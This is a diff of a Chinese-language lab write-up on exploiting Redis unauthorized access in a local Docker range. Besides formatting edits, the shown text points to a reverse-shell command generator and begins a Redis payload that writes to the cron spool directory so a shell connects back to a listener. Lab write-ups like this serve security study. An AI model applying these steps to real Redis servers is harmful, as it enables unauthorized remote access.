@@ -3,6 +3,7 @@ title: Redis 未授权访问漏洞
 tags:
   - 渗透测试
   - redis
+  - vulhub
 creation date: 2024-04-10
 done: true
 ---
@@ -52,17 +53,13 @@ Redis 客户端：
 在 Redis 6.0 版本，配置文件中引入了 `enable-protected-configs`，这个参数用于保护 Redis 的配置文件不被非授权用户修改。在此之前，Redis 的配置文件是可以被任何用户修改的，这可能导致安全风险，特别是在未授权访问的情况下。通过设置 `enable-protected-configs` 参数为 `yes`，可以确保只有授权的用户能够修改 Redis 的配置文件。所以选择 Redis 5.0 进行练习。  
 - 攻击环境：kali  
 - 靶场环境：docker（安装在 kali）  
-	- Redis 5.0 的 docker 官方镜像（debian 11）
-	- apache 2
-	- php
-	- cron
-	- ssh
+	docker 镜像：Redis 5.0 的 docker 官方镜像（debian 11） + apache 2 + php + cron + ssh
 
 # 3. Redis 未授权访问漏洞利用  
 ---
 > [!tip]
 > docker 镜像中所开放的端口均没有与主机 kali 进行映射，所以全部内容均需要在 kali 中操作  
-> 首先获取 docker 靶机的 ip 地址：`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <CONTAINER-ID> `
+> 首先获取 docker 靶机的 ip 地址：`docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <CONTAINER-ID>`  
 
 可以先试用 nmap 扫描一下靶机都开放了哪些端口。  
 ![nmap扫描](https://image.yiscook.top/blog-image/202404152327327.png)
@@ -96,9 +93,7 @@ save
 
 反弹 shell 命令生成器：[反弹shell命令在线生成器|🔰雨苁🔰](https://www.ddosi.org/shell/)  
 已知靶场 IP 是：`172.18.0.2`，并且开放了 6379 和 80 端口。尝试使用 AnotherRedisDesktopManager 的控制台使用 cron 服务，来反弹 shell。  
-```
 cron 服务存放定时命令的路径通常为：`/var/spool/cron/crontabs`，所以可以尝试构造如下 payload：  
-```
 将 your-ip 和 your-port 替换为正在开启监听服务的 ip 和 port。可使用 nc 或 ncat（[Ncat - Netcat for the 21st Century](https://nmap.org/ncat/)）
 ```Redis
 config set dir /var/spool/cron/crontabs
